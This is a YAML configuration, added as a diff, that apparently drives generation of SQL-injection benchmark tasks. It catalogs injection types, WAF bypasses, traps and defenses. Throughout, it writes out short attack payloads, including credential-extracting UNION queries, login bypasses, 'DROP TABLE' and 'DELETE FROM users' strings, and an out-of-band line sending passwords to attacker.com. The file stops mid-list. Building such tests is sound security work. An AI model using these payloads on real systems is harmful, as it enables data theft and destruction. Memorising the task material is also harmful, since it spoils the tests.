@@ -1,0 +1,1659 @@
+id: "db-sql-query-injection-trap-001"
+version: "2.0.0"
+category: "databases"
+subcategory: "sql"
+
+# =============================================================================
+# LLM GENERATION FRAMEWORK
+# =============================================================================
+# This configuration enables generation of 10,000+ unique, complex tasks
+# related to SQL injection vulnerabilities, prevention, and detection.
+# =============================================================================
+
+generation_framework:
+  # Difficulty parameters - SIGNIFICANTLY increased for database security architect-level challenges
+  time_range: [5400, 14400]  # 90-240 minutes for database architects with security internals expertise
+  command_steps: [80, 200]   # Requires extensive multi-layer investigation and debugging
+  
+  generation_targets:
+    minimum_difficulty: "90+ minutes, requires deep database security and query parsing internals expertise"
+    target_audience: "Principal Security Architects and database security engineers with 10+ years experience"
+    complexity_level: "Nightmare - requires synthesizing knowledge across SQL parsing, privilege systems, and WAF bypass techniques"
+  
+  multi_agent_orchestration:
+    description: "Coordinate 5-8 specialized security agents for complex injection vulnerability analysis"
+    required_agents:
+      - name: "query_parser_analyst"
+        role: "Analyze SQL parsing mechanics, tokenization, and comment handling"
+        expertise: ["lexical analysis", "grammar rules", "parser state machines", "comment stripping"]
+      - name: "privilege_escalation_expert"
+        role: "Debug privilege systems and authorization bypass techniques"
+        expertise: ["GRANT/REVOKE mechanics", "role inheritance", "impersonation", "privilege checking"]
+      - name: "waf_bypass_specialist"
+        role: "Analyze WAF rules and develop bypass techniques"
+        expertise: ["rule engines", "encoding bypass", "protocol-level evasion", "semantic analysis"]
+      - name: "blind_injection_debugger"
+        role: "Debug time-based and boolean-based blind injection scenarios"
+        expertise: ["timing analysis", "error inference", "bit extraction", "binary search optimization"]
+      - name: "stored_procedure_analyst"
+        role: "Analyze stored procedure vulnerabilities and dynamic SQL"
+        expertise: ["sp_executesql", "EXECUTE IMMEDIATE", "cursor injection", "parameter handling"]
+      - name: "orm_injection_specialist"
+        role: "Debug ORM-specific injection patterns and framework bypass"
+        expertise: ["HQL injection", "JPQL bypass", "Active Record exploits", "Django ORM vulnerabilities"]
+      - name: "second_order_tracker"
+        role: "Track data flow for second-order injection detection"
+        expertise: ["data lineage", "taint analysis", "storage-retrieval patterns", "deferred execution"]
+      - name: "database_feature_exploiter"
+        role: "Exploit database-specific features for data exfiltration"
+        expertise: ["xp_cmdshell", "UTL_HTTP", "COPY TO PROGRAM", "file system access"]
+    
+    cross_engine_attack_chains:
+      - chain: "second_order_injection -> privilege_escalation -> stored_procedure_execution -> command_execution -> lateral_movement"
+        description: "Stored malicious data escalates to system command execution"
+      - chain: "blind_injection -> schema_enumeration -> credential_extraction -> privilege_escalation -> data_exfiltration"
+        description: "Blind injection leads to full database compromise through progressive exploitation"
+      - chain: "waf_bypass -> union_injection -> file_read -> credential_theft -> database_takeover"
+        description: "WAF evasion enables union-based extraction leading to database compromise"
+      - chain: "orm_injection -> batch_manipulation -> transaction_poisoning -> data_corruption -> audit_log_tampering"
+        description: "ORM bypass enables transaction-level attacks that evade audit logging"
+    
+    parallel_analysis_requirements:
+      - "Concurrent WAF rule analysis across multiple encodings"
+      - "Parallel blind injection channel optimization"
+      - "Simultaneous privilege path enumeration"
+      - "Coordinated multi-vector attack simulation"
+    
+    agent_handoff_scenarios:
+      - from: "query_parser_analyst"
+        to: "waf_bypass_specialist"
+        trigger: "Parser behavior enables WAF bypass"
+      - from: "blind_injection_debugger"
+        to: "database_feature_exploiter"
+        trigger: "Blind injection confirms exploitable database features"
+      - from: "orm_injection_specialist"
+        to: "second_order_tracker"
+        trigger: "ORM injection creates stored payload for second-order attack"
+  
+  multi_conversation_workflow:
+    phase_1_research: |
+      Research advanced SQL injection techniques and bypass methods:
+      - Database-specific injection syntax
+      - WAF bypass techniques
+      - Encoding and obfuscation methods
+      - Blind injection techniques
+      - Time-based and error-based extraction
+    
+    phase_2_creation: |
+      Create task with hidden complexity and traps including:
+      - Subtle injection vectors
+      - Second-order injection scenarios
+      - Stored procedure vulnerabilities
+      - ORM-specific injection patterns
+      - Multi-vector attack chains
+    
+    phase_3_amplification: |
+      Add difficulty multipliers and edge cases:
+      - WAF evasion requirements
+      - Minimal privilege exploitation
+      - Chained vulnerabilities
+      - Defense bypass scenarios
+      - Real-world application contexts
+    
+    phase_4_verification: |
+      Validate task requires deep security expertise:
+      - Must understand database query parsing and privilege system internals
+      - Must know multiple injection techniques including second-order and blind variants
+      - Cannot be solved by simple sanitization, escaping, or single-layer defense
+      - Requires comprehensive defense-in-depth approach with multiple security layers
+      - Tests understanding of secure coding across the entire application stack
+      - Has at least 10+ deeply interacting traps across parsing/authorization/WAF/application layers
+      - Has cascading attack chains that span input handling, storage, retrieval, and execution
+      - Requires knowledge of database security internals, parser edge cases, and privilege escalation paths
+      - Would take experienced security architects 90+ minutes
+      - Involves chained vulnerabilities requiring multi-stage exploitation
+  
+  quality_requirements:
+    - "Must require understanding of SQL parsing, execution planning, and privilege checking internals"
+    - "Must have at least 8 non-obvious attack vectors with complex chaining potential"
+    - "Must not be solvable by simple escaping, parameterization, or WAF rules alone"
+    - "Must require comprehensive defense strategy spanning multiple application layers"
+    - "Must involve database-specific or version-specific security behaviors"
+    - "90+ minutes for experienced security architects, 180+ for senior engineers"
+    - "Requires synthesizing injection techniques, WAF bypass, privilege escalation, and database internals"
+    - "Must involve second-order injection scenarios with complex data flow"
+    - "Requires understanding of encoding bypass, parser quirks, and semantic analysis"
+
+# =============================================================================
+# TOPIC UNIVERSE - 150+ SQL Injection Topics
+# =============================================================================
+
+topic_universe:
+  # ---------------------------------------------------------------------------
+  # Injection Types
+  # ---------------------------------------------------------------------------
+  injection_types:
+    classic_injection:
+      union_based:
+        description: "Extract data via UNION SELECT"
+        techniques:
+          - "Column count detection via ORDER BY"
+          - "Data type matching for UNION"
+          - "NULL padding for column alignment"
+          - "Extracting schema information"
+        example: "' UNION SELECT username, password FROM users--"
+        databases: ["All"]
+      
+      error_based:
+        description: "Extract data via error messages"
+        techniques:
+          postgresql:
+            - "CAST to trigger conversion errors"
+            - "EXTRACTVALUE for XML errors"
+          mysql:
+            - "EXTRACTVALUE()"
+            - "UPDATEXML()"
+            - "FLOOR(RAND())*2 GROUP BY"
+          sql_server:
+            - "CONVERT() type errors"
+            - "STR() precision overflow"
+          oracle:
+            - "CTXSYS.DRITHSX.SN"
+            - "UTL_INADDR.GET_HOST_NAME"
+      
+      boolean_based_blind:
+        description: "Infer data via true/false responses"
+        techniques:
+          - "Conditional responses (1=1 vs 1=2)"
+          - "Content-based detection"
+          - "HTTP status code differences"
+          - "Response length analysis"
+        example: "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a"
+      
+      time_based_blind:
+        description: "Infer data via response timing"
+        techniques:
+          postgresql: "pg_sleep(5)"
+          mysql: "SLEEP(5), BENCHMARK()"
+          sql_server: "WAITFOR DELAY '0:0:5'"
+          oracle: "DBMS_PIPE.RECEIVE_MESSAGE()"
+        example: "' AND IF(1=1, SLEEP(5), 0)--"
+      
+      out_of_band:
+        description: "Exfiltrate data via DNS/HTTP"
+        techniques:
+          sql_server: "xp_dirtree, xp_fileexist"
+          oracle: "UTL_HTTP, UTL_INADDR"
+          mysql: "LOAD_FILE() (limited)"
+          postgresql: "COPY TO PROGRAM, dblink"
+    
+    second_order_injection:
+      description: "Payload stored, executed later"
+      scenarios:
+        - "Username stored, used in dynamic SQL later"
+        - "Profile data used in admin queries"
+        - "Log entries parsed unsafely"
+        - "Email addresses in report queries"
+      danger: "Bypasses input validation at entry point"
+    
+    stored_procedure_injection:
+      description: "Injection via stored procedure parameters"
+      vulnerable_patterns:
+        - "Dynamic SQL with EXEC"
+        - "String concatenation in procedures"
+        - "Cursor-based dynamic queries"
+      databases_affected: ["All"]
+    
+    nosql_injection:
+      mongodb:
+        operators: ["$gt", "$ne", "$regex", "$where"]
+        example: '{"$gt": ""}'
+      couchdb: "JavaScript injection in map/reduce"
+      redis: "Command injection in Lua scripts"
+    
+    orm_injection:
+      hibernate:
+        hql_injection: "Injection in HQL queries"
+        criteria_injection: "Restriction bypass"
+      sqlalchemy:
+        raw_queries: "text() without binding"
+        filter_bypass: "Operator injection"
+      active_record:
+        conditions_injection: "String interpolation in conditions"
+        order_injection: "Injection in ORDER BY"
+      django:
+        extra_injection: "extra() method vulnerabilities"
+        raw_injection: "raw() without parameters"
+
+  # ---------------------------------------------------------------------------
+  # Attack Vectors
+  # ---------------------------------------------------------------------------
+  attack_vectors:
+    input_fields:
+      - "Login forms (username, password)"
+      - "Search boxes"
+      - "URL parameters"
+      - "HTTP headers (User-Agent, Referer, X-Forwarded-For)"
+      - "Cookie values"
+      - "Hidden form fields"
+      - "JSON/XML payloads"
+      - "File upload names"
+    
+    numeric_parameters:
+      description: "No quotes needed for injection"
+      examples:
+        - "?id=1 OR 1=1"
+        - "?page=1;DROP TABLE users"
+        - "?limit=1,100"
+      bypass: "Often not sanitized because 'it's just a number'"
+    
+    like_pattern_injection:
+      description: "Wildcards in LIKE clauses"
+      payloads:
+        - "%' OR '%'='"
+        - "_' OR '_'='_"
+        - "a]%' OR '1'='1"  # Bracket escape
+      dos_variant: "LIKE '%a%a%a%a%a%a%a%a%'" # ReDoS-like
+    
+    order_by_injection:
+      description: "Injection in ORDER BY clause"
+      techniques:
+        - "ORDER BY CASE WHEN (SELECT...) THEN 1 ELSE 2 END"
+        - "ORDER BY (SELECT password FROM users LIMIT 1)"
+        - "ORDER BY 1; DROP TABLE users--"
+    
+    group_by_injection:
+      description: "Injection in GROUP BY clause"
+      techniques:
+        - "GROUP BY (SELECT...)"
+        - "GROUP BY 1, (SELECT password)"
+    
+    having_injection:
+      description: "Injection in HAVING clause"
+      techniques:
+        - "HAVING 1=1 OR (SELECT...)"
+        - "HAVING COUNT(*) > (SELECT...)"
+    
+    insert_injection:
+      description: "Injection in INSERT statements"
+      techniques:
+        - "Multiple row injection"
+        - "Subquery injection in VALUES"
+        - "ON DUPLICATE KEY exploitation"
+    
+    update_injection:
+      description: "Injection in UPDATE statements"
+      techniques:
+        - "WHERE clause manipulation"
+        - "SET value subquery injection"
+        - "Multi-table UPDATE injection"
+    
+    delete_injection:
+      description: "Injection in DELETE statements"
+      techniques:
+        - "WHERE clause bypass"
+        - "LIMIT clause injection"
+        - "Subquery in condition"
+
+  # ---------------------------------------------------------------------------
+  # Bypass Techniques
+  # ---------------------------------------------------------------------------
+  bypass_techniques:
+    encoding_bypasses:
+      url_encoding:
+        - "%27 = '"
+        - "%2527 = double encoding"
+        - "%00 = null byte"
+      unicode_encoding:
+        - "\\u0027 = '"
+        - "\\x27 = '"
+      html_encoding:
+        - "&#39; = '"
+        - "&#x27; = '"
+      hex_encoding:
+        - "0x27 = '"
+        - "CHAR(39) = '"
+    
+    comment_variations:
+      mysql:
+        - "-- "
+        - "#"
+        - "/*comment*/"
+        - "/*! MySQL specific */"
+        - "/*!50000 version specific */"
+      postgresql:
+        - "--"
+        - "/*comment*/"
+      sql_server:
+        - "--"
+        - "/*comment*/"
+      oracle:
+        - "--"
+        - "/*comment*/"
+    
+    keyword_obfuscation:
+      case_variation: "SeLeCt, UNION, UNioN"
+      spaces_replacement:
+        - "/**/SELECT/**/"
+        - "UNION%0ASELECT"
+        - "UNION%09SELECT"
+        - "UNION%0DSELECT"
+      keyword_splitting:
+        - "UNI/**/ON"
+        - "SE/**/LECT"
+      scientific_notation: "1e0UNION SELECT"
+      null_byte: "SEL%00ECT"
+    
+    waf_bypasses:
+      generic:
+        - "Using equivalent functions"
+        - "Alternative syntax"
+        - "Chunked transfer encoding"
+        - "Parameter pollution"
+      specific_waf:
+        modsecurity:
+          - "Multipart content type abuse"
+          - "Overlong UTF-8 encoding"
+        cloudflare:
+          - "JSON body encoding"
+          - "Unusual content types"
+        aws_waf:
+          - "Parameter fragmentation"
+          - "Unicode normalization"
+    
+    filter_bypasses:
+      no_spaces: "UNION/**/SELECT/**/FROM"
+      no_quotes: "CHAR(97,100,109,105,110)"
+      no_commas: "UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b"
+      no_equals: "LIKE, BETWEEN, REGEXP"
+      no_or_and: "||, &&, XOR"
+      blacklist_bypass:
+        - "SESELECTLECT -> SELECT"
+        - "Using synonyms"
+
+  # ---------------------------------------------------------------------------
+  # Database-Specific Features
+  # ---------------------------------------------------------------------------
+  database_specific:
+    mysql:
+      information_schema:
+        - "information_schema.tables"
+        - "information_schema.columns"
+        - "information_schema.schemata"
+      special_features:
+        - "INTO OUTFILE (file write)"
+        - "LOAD DATA INFILE (file read)"
+        - "User-defined functions"
+        - "Prepared statements"
+      version_detection: "@@version, VERSION()"
+    
+    postgresql:
+      system_catalogs:
+        - "pg_catalog.pg_tables"
+        - "pg_catalog.pg_columns"
+        - "information_schema"
+      special_features:
+        - "COPY TO/FROM (file operations)"
+        - "lo_import/lo_export (large objects)"
+        - "dblink (database links)"
+        - "PL/pgSQL code execution"
+      version_detection: "version()"
+      command_execution: "COPY ... TO PROGRAM (9.3+)"
+    
+    sql_server:
+      system_tables:
+        - "sys.tables"
+        - "sys.columns"
+        - "INFORMATION_SCHEMA"
+      special_features:
+        - "xp_cmdshell (command execution)"
+        - "xp_dirtree (directory listing)"
+        - "sp_OACreate (COM objects)"
+        - "OPENROWSET (remote queries)"
+        - "Linked servers"
+      version_detection: "@@VERSION"
+    
+    oracle:
+      system_views:
+        - "all_tables"
+        - "all_tab_columns"
+        - "dba_tables"
+      special_features:
+        - "UTL_HTTP (HTTP requests)"
+        - "UTL_FILE (file operations)"
+        - "DBMS_SCHEDULER (job scheduling)"
+        - "Java stored procedures"
+      version_detection: "SELECT * FROM V$VERSION"
+
+  # ---------------------------------------------------------------------------
+  # Exploitation Goals
+  # ---------------------------------------------------------------------------
+  exploitation_goals:
+    data_extraction:
+      techniques:
+        - "Schema enumeration"
+        - "Data exfiltration"
+        - "Credential theft"
+        - "Business data extraction"
+    
+    authentication_bypass:
+      techniques:
+        - "Login bypass"
+        - "Password reset manipulation"
+        - "Session hijacking"
+        - "Privilege escalation"
+    
+    data_modification:
+      techniques:
+        - "Record modification"
+        - "Record deletion"
+        - "Privilege granting"
+        - "User creation"
+    
+    denial_of_service:
+      techniques:
+        - "Heavy query execution"
+        - "Resource exhaustion"
+        - "Lock contention"
+        - "Table corruption"
+    
+    system_compromise:
+      techniques:
+        - "Command execution"
+        - "File read/write"
+        - "Network pivoting"
+        - "Malware deployment"
+
+  # ---------------------------------------------------------------------------
+  # Defense Techniques
+  # ---------------------------------------------------------------------------
+  defense_techniques:
+    parameterized_queries:
+      description: "Use prepared statements with parameters"
+      languages:
+        java: "PreparedStatement with ?"
+        python: "cursor.execute(sql, params)"
+        php: "PDO with bindValue/bindParam"
+        node_js: "Parameterized queries"
+        csharp: "SqlCommand.Parameters"
+      limitations:
+        - "Cannot parameterize identifiers"
+        - "Some dynamic queries difficult"
+    
+    stored_procedures:
+      benefits:
+        - "Encapsulate SQL logic"
+        - "Permission separation"
+        - "Input validation in procedure"
+      risks:
+        - "Dynamic SQL in procedure still vulnerable"
+        - "EXECUTE IMMEDIATE issues"
+    
+    input_validation:
+      whitelist_validation:
+        - "Allowed characters only"
+        - "Expected format enforcement"
+        - "Type validation"
+      blacklist_validation:
+        - "Less effective"
+        - "Easy to bypass"
+        - "Maintenance burden"
+    
+    output_encoding:
+      context_dependent:
+        - "HTML encoding for web"
+        - "JSON encoding for APIs"
+        - "Not primary defense for SQLi"
+    
+    least_privilege:
+      database_level:
+        - "Minimal permissions"
+        - "Separate accounts per application"
+        - "No DBA privileges for apps"
+      network_level:
+        - "Database not internet-accessible"
+        - "Network segmentation"
+    
+    waf_and_ids:
+      web_application_firewall:
+        - "SQLi pattern detection"
+        - "Request filtering"
+        - "Rate limiting"
+      intrusion_detection:
+        - "Query monitoring"
+        - "Anomaly detection"
+        - "Alert generation"
+    
+    error_handling:
+      principles:
+        - "Generic error messages to users"
+        - "Detailed logging internally"
+        - "No stack traces in production"
+
+# =============================================================================
+# TRAP TYPES - 80+ SQL Injection Traps
+# =============================================================================
+
+trap_types:
+  # ---------------------------------------------------------------------------
+  # Input Validation Traps
+  # ---------------------------------------------------------------------------
+  input_validation:
+    - trap_id: "IV-001"
+      name: "Numeric Parameter Without Quotes"
+      description: "Numeric parameters not quoted, injection without quotes"
+      trigger: "WHERE id = $user_input without validation"
+      difficulty: "easy"
+      example: "?id=1 OR 1=1"
+      mitigation: "Parameterize or cast to int"
+    
+    - trap_id: "IV-002"
+      name: "Whitespace Alternative Bypass"
+      description: "Filter strips spaces but not other whitespace"
+      trigger: "Using tabs, newlines, or comments"
+      difficulty: "medium"
+      example: "UNION%0ASELECT%0A*%0AFROM%0Ausers"
+    
+    - trap_id: "IV-003"
+      name: "Double Encoding Bypass"
+      description: "Single decoding leaves encoded characters"
+      trigger: "URL decoding only once"
+      difficulty: "medium"
+      example: "%2527 -> %27 -> '"
+    
+    - trap_id: "IV-004"
+      name: "Case Sensitivity Bypass"
+      description: "Filter checks lowercase only"
+      trigger: "Using mixed case keywords"
+      difficulty: "easy"
+      example: "UnIoN SeLeCt"
+    
+    - trap_id: "IV-005"
+      name: "Null Byte Injection"
+      description: "Null byte terminates string in some parsers"
+      trigger: "Append %00 to bypass extension check"
+      difficulty: "medium"
+      example: "SELECT%00*%00FROM"
+
+  # ---------------------------------------------------------------------------
+  # Query Construction Traps
+  # ---------------------------------------------------------------------------
+  query_construction:
+    - trap_id: "QC-001"
+      name: "String Concatenation in Procedure"
+      description: "Stored procedure uses string concatenation"
+      trigger: "EXEC('SELECT * FROM ' + @tablename)"
+      difficulty: "medium"
+      mitigation: "Use sp_executesql with parameters"
+    
+    - trap_id: "QC-002"
+      name: "Dynamic Table/Column Names"
+      description: "User input used as identifier"
+      trigger: "ORDER BY $column"
+      difficulty: "hard"
+      mitigation: "Whitelist allowed identifiers"
+    
+    - trap_id: "QC-003"
+      name: "LIKE Pattern Not Escaped"
+      description: "LIKE wildcards not escaped"
+      trigger: "WHERE name LIKE '%$input%'"
+      difficulty: "medium"
+      example: "input = %' OR '%'='"
+    
+    - trap_id: "QC-004"
+      name: "IN Clause Dynamic Generation"
+      description: "IN clause built from array"
+      trigger: "WHERE id IN ($ids)"
+      difficulty: "medium"
+      example: "ids = 1,2,3) OR (1=1"
+    
+    - trap_id: "QC-005"
+      name: "JSON/XML Injection in Query"
+      description: "JSON or XML data used in query"
+      trigger: "Query building from JSON fields"
+      difficulty: "hard"
+      example: '{"field": "value\"; DROP TABLE--"}'
+
+  # ---------------------------------------------------------------------------
+  # Second Order Injection Traps
+  # ---------------------------------------------------------------------------
+  second_order:
+    - trap_id: "SO-001"
+      name: "Stored Username Injection"
+      description: "Username stored safely, used unsafely later"
+      trigger: "Admin panel query using stored username"
+      difficulty: "hard"
+      example: "Register as 'admin'--', gets used in admin query"
+    
+    - trap_id: "SO-002"
+      name: "Log Entry Injection"
+      description: "Log entry parsed and used in query"
+      trigger: "Log analysis tool uses log data in SQL"
+      difficulty: "hard"
+      example: "User-Agent header ends up in SQL query"
+    
+    - trap_id: "SO-003"
+      name: "Profile Data Injection"
+      description: "Profile field used in dynamic report"
+      trigger: "Report generator uses profile data"
+      difficulty: "hard"
+      example: "Job title field injected, used in HR report"
+    
+    - trap_id: "SO-004"
+      name: "Email Address Injection"
+      description: "Email stored, used in notification query"
+      trigger: "Batch email process uses stored addresses"
+      difficulty: "hard"
+      example: "email'; DELETE FROM users--@example.com"
+
+  # ---------------------------------------------------------------------------
+  # ORM Injection Traps
+  # ---------------------------------------------------------------------------
+  orm_injection:
+    - trap_id: "OI-001"
+      name: "Raw Query Without Parameters"
+      description: "ORM raw query method without parameterization"
+      trigger: "Model.raw('SELECT * FROM ' + table)"
+      difficulty: "medium"
+      databases: ["All ORMs"]
+    
+    - trap_id: "OI-002"
+      name: "Extra/Annotate Injection"
+      description: "ORM extra() or annotate() with raw SQL"
+      trigger: "Django extra(), SQLAlchemy text()"
+      difficulty: "hard"
+    
+    - trap_id: "OI-003"
+      name: "Order By Injection in ORM"
+      description: "User input in order_by without validation"
+      trigger: "Model.objects.order_by(user_input)"
+      difficulty: "medium"
+    
+    - trap_id: "OI-004"
+      name: "Filter Key Injection"
+      description: "Filter key from user input"
+      trigger: "Model.objects.filter(**{user_key: value})"
+      difficulty: "hard"
+      example: "user_key = 'id__gt' for privilege escalation"
+
+  # ---------------------------------------------------------------------------
+  # Blind Injection Traps
+  # ---------------------------------------------------------------------------
+  blind_injection:
+    - trap_id: "BI-001"
+      name: "Boolean Condition Leak"
+      description: "Different behavior reveals true/false"
+      trigger: "Error message or content difference"
+      difficulty: "medium"
+      exploitation: "Binary search for data"
+    
+    - trap_id: "BI-002"
+      name: "Time-Based Data Extraction"
+      description: "Timing differences reveal data"
+      trigger: "SLEEP() or heavy computation"
+      difficulty: "hard"
+      example: "IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)"
+    
+    - trap_id: "BI-003"
+      name: "Out-of-Band Data Exfiltration"
+      description: "Data sent via DNS or HTTP"
+      trigger: "UTL_HTTP, xp_dirtree"
+      difficulty: "hard"
+      example: "LOAD_FILE(CONCAT('http://attacker.com/', password))"
+
+  # ---------------------------------------------------------------------------
+  # Authentication Bypass Traps
+  # ---------------------------------------------------------------------------
+  auth_bypass:
+    - trap_id: "AB-001"
+      name: "Classic Login Bypass"
+      description: "Username/password field injection"
+      trigger: "' OR '1'='1"
+      difficulty: "easy"
+    
+    - trap_id: "AB-002"
+      name: "Password Reset Token Manipulation"
+      description: "Token validation via SQL injection"
+      trigger: "Reset token compared in SQL"
+      difficulty: "medium"
+    
+    - trap_id: "AB-003"
+      name: "Session ID in Database"
+      description: "Session validation vulnerable"
+      trigger: "Session ID compared in SQL"
+      difficulty: "medium"
+    
+    - trap_id: "AB-004"
+      name: "Multi-Factor Bypass"
+      description: "MFA validation in SQL"
+      trigger: "TOTP code compared in SQL"
+      difficulty: "hard"
+
+  # ---------------------------------------------------------------------------
+  # Privilege Escalation Traps
+  # ---------------------------------------------------------------------------
+  privilege_escalation:
+    - trap_id: "PE-001"
+      name: "Role Modification via Injection"
+      description: "Update own role via SQL injection"
+      trigger: "Profile update with SQL injection"
+      difficulty: "medium"
+      example: "name=John', role='admin' WHERE id=1--"
+    
+    - trap_id: "PE-002"
+      name: "Access Control Bypass"
+      description: "Bypass row-level security"
+      trigger: "Owner check in WHERE clause"
+      difficulty: "medium"
+      example: "WHERE owner_id = $user_id OR 1=1"
+    
+    - trap_id: "PE-003"
+      name: "Admin Panel Access"
+      description: "Access admin functionality"
+      trigger: "Admin check via SQL"
+      difficulty: "medium"
+
+  # ---------------------------------------------------------------------------
+  # DoS Traps
+  # ---------------------------------------------------------------------------
+  denial_of_service:
+    - trap_id: "DOS-001"
+      name: "Heavy Query Injection"
+      description: "Inject resource-intensive query"
+      trigger: "Cross join or cartesian product"
+      difficulty: "medium"
+      example: "UNION SELECT * FROM users, users, users"
+    
+    - trap_id: "DOS-002"
+      name: "LIKE ReDoS Pattern"
+      description: "Complex LIKE pattern causes slow matching"
+      trigger: "LIKE '%a%a%a%a%a%a%'"
+      difficulty: "medium"
+    
+    - trap_id: "DOS-003"
+      name: "Lock Table Injection"
+      description: "Inject locking statements"
+      trigger: "LOCK TABLES, SELECT FOR UPDATE"
+      difficulty: "hard"
+
+  # ---------------------------------------------------------------------------
+  # WAF Bypass Traps
+  # ---------------------------------------------------------------------------
+  waf_bypass:
+    - trap_id: "WB-001"
+      name: "Comment Obfuscation"
+      description: "Use comments to break up keywords"
+      trigger: "UN/**/ION SE/**/LECT"
+      difficulty: "medium"
+    
+    - trap_id: "WB-002"
+      name: "HTTP Parameter Pollution"
+      description: "Multiple parameters confuse WAF"
+      trigger: "?id=1&id=UNION SELECT"
+      difficulty: "hard"
+    
+    - trap_id: "WB-003"
+      name: "Content-Type Manipulation"
+      description: "Unusual content type bypasses WAF"
+      trigger: "application/json vs form-urlencoded"
+      difficulty: "hard"
+
+# =============================================================================
+# EDGE CASES - 100+ Edge Cases
+# =============================================================================
+
+edge_cases:
+  # ---------------------------------------------------------------------------
+  # Character Encoding Edge Cases
+  # ---------------------------------------------------------------------------
+  encoding:
+    - case_id: "ENC-001"
+      name: "Multi-byte Character Splitting"
+      description: "UTF-8 multi-byte chars split across boundaries"
+      impact: "Escape sequence broken"
+    
+    - case_id: "ENC-002"
+      name: "Overlong UTF-8 Encoding"
+      description: "Non-canonical UTF-8 representation"
+      impact: "May bypass validation"
+    
+    - case_id: "ENC-003"
+      name: "GBK/Big5 Character Set"
+      description: "Asian character sets with special handling"
+      impact: "Quote escaping issues in MySQL"
+    
+    - case_id: "ENC-004"
+      name: "Unicode Normalization"
+      description: "Different Unicode forms of same character"
+      impact: "Validation bypass"
+
+  # ---------------------------------------------------------------------------
+  # Database Version Edge Cases
+  # ---------------------------------------------------------------------------
+  version_specific:
+    mysql:
+      - case_id: "MY-001"
+        name: "NO_BACKSLASH_ESCAPES Mode"
+        description: "Backslash not an escape character"
+        impact: "Escape bypass"
+      
+      - case_id: "MY-002"
+        name: "ANSI_QUOTES Mode"
+        description: "Double quotes for identifiers"
+        impact: "Different injection syntax needed"
+    
+    postgresql:
+      - case_id: "PG-001"
+        name: "Standard Conforming Strings"
+        description: "Backslash handling changes"
+        impact: "Escape sequence behavior"
+      
+      - case_id: "PG-002"
+        name: "Dollar Quoting"
+        description: "$$text$$ quoting syntax"
+        impact: "Alternative string syntax"
+    
+    sql_server:
+      - case_id: "SS-001"
+        name: "Quoted Identifier Setting"
+        description: "QUOTED_IDENTIFIER ON/OFF"
+        impact: "Identifier handling changes"
+      
+      - case_id: "SS-002"
+        name: "CONCAT_NULL_YIELDS_NULL"
+        description: "NULL concatenation behavior"
+        impact: "Query result differences"
+
+  # ---------------------------------------------------------------------------
+  # Application Context Edge Cases
+  # ---------------------------------------------------------------------------
+  application:
+    - case_id: "APP-001"
+      name: "API vs Web Interface"
+      description: "Different input validation paths"
+      impact: "API may be less protected"
+    
+    - case_id: "APP-002"
+      name: "Mobile App Backend"
+      description: "Different encoding expectations"
+      impact: "Unicode handling issues"
+    
+    - case_id: "APP-003"
+      name: "Microservices Architecture"
+      description: "Input validated in one service, used in another"
+      impact: "Validation disconnect"
+    
+    - case_id: "APP-004"
+      name: "GraphQL Queries"
+      description: "SQL injection in GraphQL resolvers"
+      impact: "Less tested attack surface"
+
+  # ---------------------------------------------------------------------------
+  # Data Type Edge Cases
+  # ---------------------------------------------------------------------------
+  data_types:
+    - case_id: "DT-001"
+      name: "Scientific Notation in Numbers"
+      description: "1e1 parsed as number"
+      impact: "Bypass numeric validation"
+    
+    - case_id: "DT-002"
+      name: "Boolean Coercion"
+      description: "Different truthy/falsy values"
+      impact: "Condition manipulation"
+    
+    - case_id: "DT-003"
+      name: "Date Format Injection"
+      description: "Date string with injection"
+      impact: "Datetime parsing issues"
+    
+    - case_id: "DT-004"
+      name: "UUID with Injection"
+      description: "UUID field with malicious content"
+      impact: "UUID validation bypass"
+
+# =============================================================================
+# DIFFICULTY MULTIPLIERS
+# =============================================================================
+
+difficulty_multipliers:
+  difficulty_amplifiers:
+    nightmare:
+      multiplier: 3.0
+      description: "Extreme difficulty requiring expert DBA knowledge across multiple systems"
+      requirements:
+        - "7+ interacting traps across storage engine, query optimizer, and lock manager"
+        - "Requires understanding of database internals and source code behavior"
+        - "Time estimate: 90+ minutes for senior database engineers"
+        - "Cross-database compatibility issues that manifest differently"
+        - "Requires synthesizing SQL, transactions, and distributed systems knowledge"
+    
+    nightmare_plus:
+      multiplier: 5.0
+      estimated_time: [28800, 172800]  # 8-48 hours
+      command_steps: [400, 1500]
+      techniques_required: 12
+      description: "Database security research difficulty requiring parser internals and privilege system expertise"
+      requirements:
+        - "12+ deeply interacting vulnerabilities across parsing, authorization, WAF, and application layers"
+        - "Requires understanding of SQL parser source code and lexical analysis edge cases"
+        - "Time estimate: 8-48 hours for principal security architects"
+        - "Cross-database exploitation requiring deep parser and privilege system knowledge"
+        - "Requires synthesizing WAF bypass, encoding tricks, and database feature exploitation"
+        - "Must develop novel bypass techniques for modern security controls"
+        - "Requires understanding of blind injection optimization and out-of-band exfiltration"
+        - "Must chain multiple vulnerabilities for complete database compromise"
+  
+  storage_engine_internals:
+    parser_internals:
+      description: "SQL parser mechanics affecting injection"
+      factors:
+        - "Lexical analysis state machine quirks"
+        - "Comment handling across parser modes"
+        - "String literal escape sequence processing"
+        - "Identifier quoting and case folding"
+      multiplier: 1.9
+    
+    privilege_system_internals:
+      description: "Authorization and privilege checking internals"
+      factors:
+        - "Privilege cache timing and invalidation"
+        - "Role inheritance resolution order"
+        - "Object ownership privilege bypasses"
+        - "Security definer vs invoker context"
+      multiplier: 2.0
+    
+    query_execution_internals:
+      description: "Query execution affecting injection impact"
+      factors:
+        - "Prepared statement handling edge cases"
+        - "Dynamic SQL execution context"
+        - "Procedure privilege escalation paths"
+        - "Cross-database query execution"
+      multiplier: 1.8
+    
+    storage_access_internals:
+      description: "Storage layer access for data extraction"
+      factors:
+        - "File system access functions"
+        - "External table creation for exfiltration"
+        - "Large object access and manipulation"
+        - "Backup and export feature exploitation"
+      multiplier: 2.1
+    
+    audit_evasion_internals:
+      description: "Audit log bypass and tampering"
+      factors:
+        - "Audit trigger bypass techniques"
+        - "Log table manipulation via injection"
+        - "Audit configuration tampering"
+        - "Timing attacks on audit systems"
+      multiplier: 1.7
+    
+    replication_exploitation:
+      description: "Replication system exploitation via injection"
+      factors:
+        - "Replication user privilege abuse"
+        - "Binary log manipulation"
+        - "Logical replication slot exploitation"
+        - "CDC stream poisoning"
+      multiplier: 2.2
+  
+  distributed_database_complexity:
+    cross_shard_injection:
+      distributed_query_injection:
+        - "Injection in distributed query routing"
+        - "Shard key manipulation for data access"
